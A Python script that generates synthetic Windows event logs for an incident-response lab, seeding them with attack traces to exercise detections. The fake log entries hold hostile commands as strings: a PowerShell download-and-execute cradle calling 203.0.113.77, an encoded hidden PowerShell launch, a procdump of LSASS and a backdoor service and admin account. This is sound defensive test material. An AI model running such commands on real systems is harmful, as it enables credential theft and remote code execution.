"""
generate_sample.py — synthetic Windows event logs for windows-ir-lab

Produces JSON in the SAME shape as collect_logs.ps1's real export, so the
analyzer works identically on synthetic or real data. Lets you run and test
the whole detection pipeline without needing to export real logs first.

Embeds Windows-specific attack techniques the detections are built to catch:
  - Failed-logon brute force + eventual success   (T1110)
  - Suspicious PowerShell (encoded command)        (T1059.001)
  - New account creation + add to admins           (T1136 / T1098)
  - Service install for persistence                 (T1543.003)
  - LSASS access pattern (credential dumping proxy) (T1003.001)

100% SYNTHETIC. Fake hostnames/SIDs. No real credentials or systems.
"""
import json, random, os
from datetime import datetime, timedelta

random.seed(42)
os.makedirs("exported_logs", exist_ok=True)
BASE = datetime(2026, 6, 20, 9, 0, 0)

def t(mins): return (BASE + timedelta(minutes=mins)).strftime("%Y-%m-%dT%H:%M:%S")

USERS = ["jdoe", "asmith", "mchen", "svc_backup"]
HOST = "WIN-DESK01"

# ---------- Security log ----------
sec = []

# normal successful logons
for i in range(40):
    u = random.choice(USERS)
    sec.append({"TimeCreated": t(i*3), "Id": 4624, "LevelDisplayName": "Information",
                "ProviderName": "Microsoft-Windows-Security-Auditing", "MachineName": HOST,
                "UserId": None,
                "Message": f"An account was successfully logged on. Account Name: {u} "
                           f"Logon Type: 2 Source Network Address: 10.0.0.{random.randint(2,50)}"})

# ATTACK: brute force — many 4625 failures against 'administrator' then a 4624 success
for i in range(25):
    sec.append({"TimeCreated": t(120 + i*0.2), "Id": 4625, "LevelDisplayName": "Information",
                "ProviderName": "Microsoft-Windows-Security-Auditing", "MachineName": HOST,
                "UserId": None,
                "Message": "An account failed to log on. Account Name: administrator "
                           "Logon Type: 3 Source Network Address: 203.0.113.77 "
                           "Failure Reason: Unknown user name or bad password. Status: 0xC000006D"})
sec.append({"TimeCreated": t(126), "Id": 4624, "LevelDisplayName": "Information",
            "ProviderName": "Microsoft-Windows-Security-Auditing", "MachineName": HOST,
            "UserId": None,
            "Message": "An account was successfully logged on. Account Name: administrator "
                       "Logon Type: 3 Source Network Address: 203.0.113.77"})

# ATTACK: account creation + add to Administrators
sec.append({"TimeCreated": t(130), "Id": 4720, "LevelDisplayName": "Information",
            "ProviderName": "Microsoft-Windows-Security-Auditing", "MachineName": HOST,
            "UserId": None,
            "Message": "A user account was created. New Account Name: backdoor_svc "
                       "Subject Account Name: administrator"})
sec.append({"TimeCreated": t(131), "Id": 4732, "LevelDisplayName": "Information",
            "ProviderName": "Microsoft-Windows-Security-Auditing", "MachineName": HOST,
            "UserId": None,
            "Message": "A member was added to a security-enabled local group. "
                       "Group Name: Administrators Member Account Name: backdoor_svc"})

# special-privilege logon noise
for i in range(5):
    sec.append({"TimeCreated": t(10 + i*20), "Id": 4672, "LevelDisplayName": "Information",
                "ProviderName": "Microsoft-Windows-Security-Auditing", "MachineName": HOST,
                "UserId": None, "Message": "Special privileges assigned to new logon. "
                f"Account Name: {random.choice(USERS)}"})

with open("exported_logs/security.json", "w") as f:
    json.dump(sec, f, indent=2)

# ---------- Sysmon ----------
sysmon = []
# normal process creates
normal_procs = ["chrome.exe", "explorer.exe", "Code.exe", "outlook.exe", "teams.exe"]
for i in range(30):
    p = random.choice(normal_procs)
    sysmon.append({"TimeCreated": t(i*4), "Id": 1, "LevelDisplayName": "Information",
                   "ProviderName": "Microsoft-Windows-Sysmon", "MachineName": HOST, "UserId": None,
                   "Message": f"Process Create: Image: C:\\Program Files\\{p} "
                              f"CommandLine: {p} User: {HOST}\\{random.choice(USERS)}"})

# ATTACK: encoded PowerShell
sysmon.append({"TimeCreated": t(132), "Id": 1, "LevelDisplayName": "Information",
               "ProviderName": "Microsoft-Windows-Sysmon", "MachineName": HOST, "UserId": None,
               "Message": "Process Create: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                          "CommandLine: powershell.exe -nop -w hidden -enc "
                          "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQ "
                          f"ParentImage: C:\\Windows\\System32\\cmd.exe User: {HOST}\\administrator"})

# ATTACK: LSASS access (credential dumping proxy — Sysmon EID 10 normally; we use a create by rare tool)
sysmon.append({"TimeCreated": t(133), "Id": 1, "LevelDisplayName": "Information",
               "ProviderName": "Microsoft-Windows-Sysmon", "MachineName": HOST, "UserId": None,
               "Message": "Process Create: Image: C:\\Users\\Public\\procdump.exe "
                          "CommandLine: procdump.exe -ma lsass.exe lsass.dmp "
                          f"User: {HOST}\\administrator"})

with open("exported_logs/sysmon.json", "w") as f:
    json.dump(sysmon, f, indent=2)

# ---------- PowerShell operational ----------
ps = []
for i in range(10):
    ps.append({"TimeCreated": t(i*10), "Id": 4104, "LevelDisplayName": "Verbose",
               "ProviderName": "Microsoft-Windows-PowerShell", "MachineName": HOST, "UserId": None,
               "Message": "Creating Scriptblock text: Get-ChildItem C:\\Users"})
# ATTACK: download cradle
ps.append({"TimeCreated": t(132), "Id": 4104, "LevelDisplayName": "Warning",
           "ProviderName": "Microsoft-Windows-PowerShell", "MachineName": HOST, "UserId": None,
           "Message": "Creating Scriptblock text: IEX (New-Object Net.WebClient)"
                      ".DownloadString('http://203.0.113.77/a.ps1')"})
with open("exported_logs/powershell.json", "w") as f:
    json.dump(ps, f, indent=2)

# ---------- System (service install) ----------
system = [{"TimeCreated": t(134), "Id": 7045, "LevelDisplayName": "Information",
           "ProviderName": "Service Control Manager", "MachineName": HOST, "UserId": None,
           "Message": "A service was installed in the system. Service Name: WinBackdoor "
                      "Service File Name: C:\\Users\\Public\\svc.exe Service Type: user mode service "
                      "Start Type: auto start"}]
with open("exported_logs/system.json", "w") as f:
    json.dump(system, f, indent=2)

print("Generated synthetic Windows logs in ./exported_logs/")
for fn, data in [("security.json", sec), ("sysmon.json", sysmon),
                 ("powershell.json", ps), ("system.json", system)]:
    print(f"  {fn:18s} {len(data)} events")
print("\nEmbedded techniques: brute force (T1110), encoded PowerShell (T1059.001),")
print("account creation+admin (T1136/T1098), LSASS dump (T1003.001), service persist (T1543.003)")
